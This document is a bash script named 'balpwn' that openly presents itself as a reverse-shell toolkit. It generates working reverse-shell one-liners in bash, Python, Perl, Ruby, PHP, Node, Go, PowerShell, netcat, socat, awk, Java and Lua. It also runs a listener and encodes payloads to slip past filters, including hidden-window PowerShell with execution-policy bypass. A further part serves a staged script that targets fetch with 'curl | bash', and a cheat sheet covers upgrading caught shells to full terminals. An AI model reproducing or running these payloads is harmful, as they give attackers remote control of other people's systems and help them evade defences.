#!/usr/bin/env bash
# balpwn — reverse-shell toolkit
# Generate payloads in every language + built-in listener
set -euo pipefail

G='\033[0;32m'; C='\033[0;36m'; Y='\033[1;33m'; M='\033[0;35m'; B='\033[1m'; D='\033[2m'; N='\033[0m'

usage() {
cat << EOF
${M}${B}balpwn${N} — reverse-shell toolkit

  ${C}listen${N} ${D}[port]${N}            Spawn listener (default 4444)
                         Uses rlwrap if available (arrow keys, history)
  ${C}gen${N} ${D}<ip> <port> [lang]${N}   Generate payload
  ${C}encode${N} ${D}<payload>${N}         Base64 / hex / url / powershell encode
  ${C}stage${N} ${D}<ip> <port>${N}        Start HTTP stager server
  ${C}pty${N}                    Upgrade dumb shell to full PTY (prints commands)

${B}LANGUAGES (gen):${N}
  bash sh zsh python python3 perl ruby php node js go
  powershell pwsh nc ncat socat awk lua java

${B}EXAMPLES${N}
  ${D}balpwn listen 4444${N}              ${D}# receive shells on :4444${N}
  ${D}balpwn gen 10.0.0.1 4444 python${N} ${D}# generate python payload${N}
  ${D}balpwn pty${N}                      ${D}# show PTY upgrade tricks${N}
EOF
}

# ── Listener ─────────────────────────────────────────────────────
listen_cmd() {
    local port="${1:-4444}"
    echo -e "${M}${B}▶ Listening on 0.0.0.0:${port}${N}"
    echo -e "${D}  (Ctrl-C to stop)${N}\n"

    # Prefer rlwrap for history + editing
    if command -v rlwrap &>/dev/null; then
        if command -v ncat &>/dev/null; then
            exec rlwrap ncat -lvnp "$port"
        else
            exec rlwrap nc -lvnp "$port"
        fi
    elif command -v ncat &>/dev/null; then
        exec ncat -lvnp "$port"
    else
        exec nc -lvnp "$port"
    fi
}

# ── Payload generator ────────────────────────────────────────────
gen_payload() {
    local ip="${1:?IP required}"
    local port="${2:?PORT required}"
    local lang="${3:-bash}"

    echo -e "${C}${B}▶ ${lang} reverse shell → ${ip}:${port}${N}\n"

    case "$lang" in
        bash|sh)
            cat << EOF
bash -i >& /dev/tcp/${ip}/${port} 0>&1

# Alt if /dev/tcp blocked:
/bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'

# Hex-encoded (bypass length filters):
echo -n "bash -i >& /dev/tcp/${ip}/${port} 0>&1" | xxd -p | tr -d '\n' | xargs -I{} bash -c 'echo {} | xxd -r -p | bash'
EOF
            ;;
        python|python3|py)
            cat << EOF
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
EOF
            ;;
        perl)
            echo "perl -e 'use Socket;\$i=\"${ip}\";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            ;;
        ruby|rb)
            echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${ip}\",\"${port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
            ;;
        php)
            echo "php -r '\$sock=fsockopen(\"${ip}\",${port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ;;
        node|js|nodejs)
            cat << EOF
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${port},"${ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})();'
EOF
            ;;
        go|golang)
            cat << EOF
# Compile with: go build -o shell shell.go
package main
import("net";"os/exec";"syscall")
func main(){c,_:=net.Dial("tcp","${ip}:${port}");sh,_:=exec.LookPath("/bin/bash");syscall.Dup2(int(c.(*net.TCPConn).File().Fd().Int()),0);syscall.Dup2(int(c.(*net.TCPConn).File().Fd().Int()),1);syscall.Dup2(int(c.(*net.TCPConn).File().Fd().Int()),2);syscall.Exec(sh,[]string{"bash"},nil)}
EOF
            ;;
        powershell|pwsh|ps)
            local payload="\$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1 | Out-String);\$sb=([text.encoding]::ASCII).GetBytes(\$r);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()}"
            echo "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"${payload}\""
            echo ""
            echo "# Base64 encoded (paste in CMD):"
            local enc=$(echo -n "$payload" | iconv -t UTF-16LE 2>/dev/null | base64 -w0 2>/dev/null || echo "(iconv required)")
            echo "powershell -NoP -NonI -W Hidden -Exec Bypass -enc ${enc}"
            ;;
        nc|ncat|netcat)
            cat << EOF
# Classic (if -e supported):
nc -e /bin/sh ${ip} ${port}

# Without -e (fifo):
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f

# OpenBSD nc:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f
EOF
            ;;
        socat)
            cat << EOF
# Full PTY right from the start — nicest shell:
socat TCP:${ip}:${port} EXEC:"bash -li",pty,stderr,setsid,sigint,sane

# Listener on your side:
socat FILE:\`tty\`,raw,echo=0 TCP-L:${port}
EOF
            ;;
        awk)
            echo "awk 'BEGIN{s=\"/inet/tcp/0/${ip}/${port}\";while(42){do{printf\"shell>\"|&s;s|&getline c;if(c){while((c|&getline)>0)print\$0|&s;close(c)}}while(c!=\"exit\")close(s)}}' /dev/null"
            ;;
        java)
            cat << EOF
# Paste into Runtime.exec() or compile:
Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/${ip}/${port} 0>&1"});
EOF
            ;;
        lua)
            echo "lua -e 'local s=require(\"socket\").tcp();s:connect(\"${ip}\",${port});while true do local r=s:receive();local f=io.popen(r,\"r\");local o=f:read(\"*a\");s:send(o);f:close();end'"
            ;;
        all)
            for L in bash python perl ruby php node go powershell nc socat awk; do
                echo -e "\n${Y}── ${L} ──${N}"
                gen_payload "$ip" "$port" "$L"
            done
            ;;
        *)
            echo -e "${R}Unknown language: $lang${N}"
            echo "Supported: bash python perl ruby php node go powershell nc socat awk lua java all"
            exit 1
            ;;
    esac
}

# ── PTY upgrade cheatsheet ───────────────────────────────────────
pty_tips() {
cat << 'EOF'
[0;36m[1m▶ Upgrading dumb shell → full PTY[0m

[1mStep 1 — spawn PTY on target:[0m
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  python -c 'import pty; pty.spawn("/bin/bash")'
  script -qc /bin/bash /dev/null

[1mStep 2 — fix terminal (on target):[0m
  export TERM=xterm-256color
  export SHELL=/bin/bash

[1mStep 3 — background, fix locally (Ctrl-Z):[0m
  stty raw -echo; fg
  reset

[1mStep 4 — sync size (your local, then on target):[0m
  stty size      [0;2m# your local[0m
  stty rows <R> cols <C>

[1mBonus — socat full PTY:[0m
  # Target:
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOU>:<PORT>
  # You:
  socat file:`tty`,raw,echo=0 tcp-l:<PORT>
EOF
}

# ── Encoder ──────────────────────────────────────────────────────
encode_payload() {
    local pl="${1:?usage: balpwn encode <payload>}"
    echo -e "${B}base64:${N}     $(echo -n "$pl" | base64 -w0)"
    echo -e "${B}base64url:${N}  $(echo -n "$pl" | base64 -w0 | tr '+/' '-_' | tr -d '=')"
    echo -e "${B}hex:${N}        $(echo -n "$pl" | xxd -p | tr -d '\n')"
    echo -e "${B}urlenc:${N}     $(echo -n "$pl" | python3 -c "import sys, urllib.parse as u; print(u.quote(sys.stdin.read()))")"
    echo -e "${B}double-url:${N} $(echo -n "$pl" | python3 -c "import sys, urllib.parse as u; print(u.quote(u.quote(sys.stdin.read())))")"
    echo -e "${B}powershell:${N} $(echo -n "$pl" | iconv -t UTF-16LE 2>/dev/null | base64 -w0)"
}

# ── HTTP stager ──────────────────────────────────────────────────
http_stager() {
    local ip="${1:-0.0.0.0}" port="${2:-8000}"
    local dir=$(mktemp -d)
    cd "$dir"
    # Write a sample payload the stager will serve
    echo "#!/bin/bash" > shell.sh
    echo "bash -i >& /dev/tcp/${ip}/4444 0>&1" >> shell.sh
    echo -e "${C}${B}▶ HTTP stager on :${port}${N}"
    echo -e "${D}  Target fetches: curl ${ip}:${port}/shell.sh | bash${N}"
    python3 -m http.server "$port" --bind 0.0.0.0
}

case "${1:-help}" in
    listen|l|lsn) shift; listen_cmd "$@" ;;
    gen|generate|shell) shift; gen_payload "$@" ;;
    encode|enc)   shift; encode_payload "$@" ;;
    stage|http)   shift; http_stager "$@" ;;
    pty|upgrade)  pty_tips ;;
    help|-h|--help|*) usage ;;
esac
